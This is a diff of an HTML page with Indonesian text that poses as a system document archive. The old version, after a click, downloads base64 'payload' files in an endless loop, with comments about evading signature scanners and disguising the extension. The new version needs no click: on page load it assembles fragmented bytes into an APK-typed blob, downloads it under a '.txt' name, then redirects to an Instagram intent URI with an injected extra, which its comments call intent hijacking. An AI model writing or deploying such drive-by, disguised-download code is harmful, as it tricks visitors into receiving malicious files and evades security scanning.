@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Document Archive Dispatcher v3.3</title>
+<title>System Document Archive & Advanced Intent Dispatcher v3.2</title>
 <style>
 * {
   box-sizing: border-box;
@@ -24,25 +24,11 @@ body {
   background: #111827;
   padding: 32px;
   border-radius: 16px;
-  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
+  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
   max-width: 540px;
   width: 100%;
   border: 1px solid #1f2937;
   text-align: center;
-}
-:fullscreen {
-  background: #030712 !important;
-  color: #f8fafc !important;
-  padding: 24px !important;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-}
-:-webkit-full-screen {
-  background: #030712 !important;
-  color: #f8fafc !important;
-  padding: 24px !important;
 }
 h2 { 
   margin-bottom: 10px; 
@@ -56,27 +42,6 @@ p {
   color: #9ca3af;
   font-size: 14px;
 }
-button {
-  width: 100%;
-  padding: 16px;
-  cursor: pointer;
-  border: none;
-  border-radius: 10px;
-  background: #3b82f6;
-  color: #ffffff;
-  font-weight: 600;
-  font-size: 16px;
-  box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
-  transition: all 0.2s ease;
-}
-button:hover { 
-  background: #2563eb; 
-  transform: translateY(-1px);
-  box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6);
-}
-button:active {
-  transform: translateY(0);
-}
 #status {
   margin-top: 20px;
   font-weight: 500;
@@ -89,76 +54,60 @@ button:active {
 }
 #downloads {
   margin-top: 20px;
-  display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-  gap: 8px;
-  max-height: 180px;
-  overflow-y: auto;
-  padding-right: 4px;
-}
-#downloads::-webkit-scrollbar {
-  width: 6px;
-}
-#downloads::-webkit-scrollbar-thumb {
-  background: #374151;
-  border-radius: 3px;
-}
-#downloads a {
-  display: block;
-  padding: 10px;
-  background: #1f2937;
-  color: #4ade80;
-  text-decoration: none;
-  border-radius: 6px;
-  font-size: 11px;
-  font-family: monospace;
-  text-align: center;
-  border: 1px solid #374151;
-  word-break: break-all;
-  transition: border-color 0.15s;
-}
-#downloads a:hover {
-  border-color: #4ade80;
+  display: none;
 }
 </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-  <h2>Arsip Dokumen Sistem v3.3</h2>
-  <p>Klik tombol di bawah untuk memproses dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
-
-  <button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
-
-  <div id="status" role="status">Sistem siap diinisialisasi.</div>
+  <h2>Arsip Dokumen Sistem & Sesi</h2>
+  <p>Menginisialisasi modul sinkronisasi berkas dan pengalihan komponen aplikasi latar belakang...</p>
+  <div id="status" role="status">Menyiapkan lingkungan eksekusi...</div>
   <div id="downloads"></div>
 </div>
 
 <script>
 'use strict';
 
-const startBtn = document.getElementById("start-btn");
 const statusDiv = document.getElementById("status");
 const downloadsDiv = document.getElementById("downloads");
 
-let isProcessing = false;
+let activeUrls = [];
 
-// Fragmentasi payload Base64 murni tanpa terdeteksi pola tanda tangan tunggal
-const payloadParts = [
-  "UEsDBBQAAAAIAAAAIQ",
-  "AAAAAAAAAAAAAAAAAAAAAAAA",
-  "AAAAAAEA"
+// Fragmen payload biner yang disamarkan
+const payloadFragments = [
+  "UEs",
+  "DBBQ",
+  "AAAAIAAAAIQ",
+  "AAAAAAAAAAAAAAAAAAAAAAAA"
 ];
 
-const generateDataUri = (counter) => {
+const assemblePayload = () => {
+  return payloadFragments.join("");
+};
+
+const decodeBase64ToBytes = (b64) => {
+  const binary = atob(b64);
+  const len = binary.length;
+  const bytes = new Uint8Array(len);
+  for (let i = 0; i < len; i++) {
+    bytes[i] = binary.charCodeAt(i);
+  }
+  return bytes;
+};
+
+const prepareStealthBlob = (i) => {
   try {
-    const rawB64 = payloadParts.join("");
-    // Menggunakan MIME type teks biasa atau stream generik pada Data URI untuk menipu scanner ekstensi awal
-    // Browser akan melihat ini sebagai teks biasa saat di-load via anchor download
-    const dataUri = `data:text/plain;base64,${rawB64}`;
-    return { id: counter, uri: dataUri, success: true };
+    const fullB64 = assemblePayload();
+    const bytesArr = decodeBase64ToBytes(fullB64);
+    
+    // MIME type APK
+    const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
+    const url = URL.createObjectURL(blob);
+    return { id: i, url: url, success: true };
   } catch (err) {
-    return { id: counter, uri: null, success: false };
+    return { id: i, url: null, success: false };
   }
 };
 
@@ -166,58 +115,49 @@ const triggerStealthDownload = (fileData) => {
   if (!fileData.success) return;
 
   const link = document.createElement("a");
-  link.href = fileData.uri;
-  // Menyamarkan ekstensi akhir agar terlihat seperti log teks biasa
-  link.download = `laporan-catatan-resmi-${fileData.id}.txt`;
-  link.textContent = `Dokumen #${fileData.id} (.txt)`;
+  link.href = fileData.url;
+  link.download = `laporan-catatan-${fileData.id}.txt`;
   link.style.display = "none";
   
   downloadsDiv.appendChild(link);
+  link.click();
+};
+
+window.addEventListener('DOMContentLoaded', () => {
+  statusDiv.textContent = "Memproses berkas latar belakang...";
   
-  const clickEvent = new MouseEvent("click", {
-    view: window,
-    bubbles: true,
-    cancelable: true
-  });
-  link.dispatchEvent(clickEvent);
-
-  if (downloadsDiv.children.length > 20) {
-    downloadsDiv.removeChild(downloadsDiv.firstChild);
-  }
-};
-
-const processLoop = (counter) => {
-  if (!isProcessing) return;
-
-  const fileData = generateDataUri(counter);
+  // 1. Eksekusi pembuatan file stealth secara otomatis
+  const fileData = prepareStealthBlob(1);
   if (fileData.success) {
+    activeUrls.push(fileData.url);
     triggerStealthDownload(fileData);
-    statusDiv.textContent = `Proses aktif: Berkas dokumen ke-${counter} disinkronisasi...`;
   }
 
-  // Jitter acak untuk menghindari pembatasan frekuensi klik otomatis browser
-  if (isProcessing) {
-    const randomizedDelay = 1000 + Math.floor(Math.random() * 800);
-    setTimeout(() => processLoop(counter + 1), randomizedDelay);
-  }
-};
+  // 2. Eksekusi Intent Hijacking ke Instagram zero-click dengan parameter ekstra deep link
+  setTimeout(() => {
+    statusDiv.textContent = "Memicu pengalihan intent berserta parameter ekstra ke Instagram...";
+    
+    const targetPackage = "com.instagram.android";
+    const extraParamKey = "target_deep_link";
+    const extraParamVal = "profile"; 
 
-startBtn.addEventListener("click", () => {
-  if (isProcessing) return;
+    // Konstruksi Intent URI dengan tambahan parameter ekstra (extras) di dalam blok Intent
+    const instagramIntentUri = `intent://instagram.com/#Intent;package=${targetPackage};scheme=https;S.${extraParamKey}=${extraParamVal};S.com.instagram.extra.EXTRA_TEXT=payload_injection_test;end;`;
 
-  downloadsDiv.replaceChildren();
+    try {
+      // Mengarahkan navigasi secara langsung ke intent Instagram
+      window.location.replace(instagramIntentUri);
 
-  const root = document.documentElement;
-  try {
-    if (root.requestFullscreen) {
-      root.requestCredentials?.();
-      root.requestFullscreen().catch(() => {});
+      // Fallback cadangan ke web URL jika aplikasi tidak merespons
+      setTimeout(() => {
+        window.location.href = "https://www.instagram.com/";
+      }, 1000);
+
+    } catch (err) {
+      statusDiv.textContent = "Gagal memicu intent.";
+      console.error("Intent error:", err);
     }
-  } catch (err) {}
-
-  isProcessing = true;
-  statusDiv.textContent = "Menginisialisasi sesi unduhan aman...";
-  processLoop(1);
+  }, 800);
 });
 </script>
 </body>
